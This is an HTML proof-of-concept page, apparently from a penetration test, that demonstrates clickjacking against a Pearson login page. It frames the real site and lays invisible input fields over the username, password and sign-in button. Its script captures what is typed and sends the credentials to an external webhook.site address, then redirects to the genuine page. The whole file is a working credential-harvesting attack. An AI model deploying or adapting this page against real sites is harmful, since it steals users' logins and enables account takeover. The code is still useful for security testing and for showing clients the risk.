<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking Impact Demo</title>
  <style>
    body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #f5f6f8; font-family: sans-serif; }
    
    iframe {
      position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: 1;
    }

    /* Red semi-transparent boxes for the client demo */
    .capture-layer {
      position: fixed;
      left: 50%;
      transform: translateX(-50%);
      width: 538px;  /* Calibrated to your screenshot */
      height: 42px;  /* Calibrated to your screenshot */
      opacity: 0.0;  /* Visible for impact demo */
      background: red;
      z-index: 1000;
      border: 1px solid black;
      outline: none;
      color: white;
      text-align: center;
      line-height: 42px;
      font-weight: bold;
      pointer-events: auto;
    }

   #fake-username { 
      top: 339px; /* Nudged up */
      width: 538px;
      height: 42px;
    } 
    #fake-password { 
      top: 430px; /* Nudged up to match spacing */
      width: 538px;
      height: 42px;
    } 
    #fake-submit { 
      top: 536px; /* Matches the blue Sign In button */
      width: 538px; 
      height: 50px; 
    }

    #banner {
      position: fixed; top: 0; left: 0; right: 0;
      background: #fff3cd; color: #856404; padding: 15px; text-align: center;
      z-index: 10000; border-bottom: 2px solid #ffeeba;
    }
  </style>
</head>
<body>

  <div id="banner">
    <strong>ATTACKER VIEW:</strong> The red boxes below are overlays capturing input before it reaches the Pearson app.
  </div>

  <iframe src="https://pentest.launchpad.pearsonprd.tech/#/clients/2e154358-4d86-11f1-bbd8-bf9d5d366960"></iframe>

  <input id="fake-username" class="capture-layer" type="text" value="[ USERNAME CAPTURE ]" onclick="this.value=''">
  <input id="fake-password" class="capture-layer" type="text" value="[ PASSWORD CAPTURE ]" onclick="this.value=''; this.type='password'">
  <div id="fake-submit" class="capture-layer" onclick="harvest()">SIGN IN (CAPTURE)</div>

  <script>
    const WEBHOOK = 'https://webhook.site/50883ea1-1ea2-4000-abb9-a395ff1f1cd7';
    function harvest() {
      const u = document.getElementById('fake-username').value;
      const p = document.getElementById('fake-password').value;
      if (u && u !== '[ USERNAME CAPTURE ]' && p) {
        navigator.sendBeacon(WEBHOOK, JSON.stringify({
          alert: "CLICKJACKING_SUCCESS",
          user: u,
          pass: p,
          url: window.location.href
        }));
        // Redirect to prove ATO
        window.location.href = "https://pentest.launchpad.pearsonprd.tech/#/clients/2e154358-4d86-11f1-bbd8-bf9d5d366960";
      }
    }
  </script>
</body>
</html>
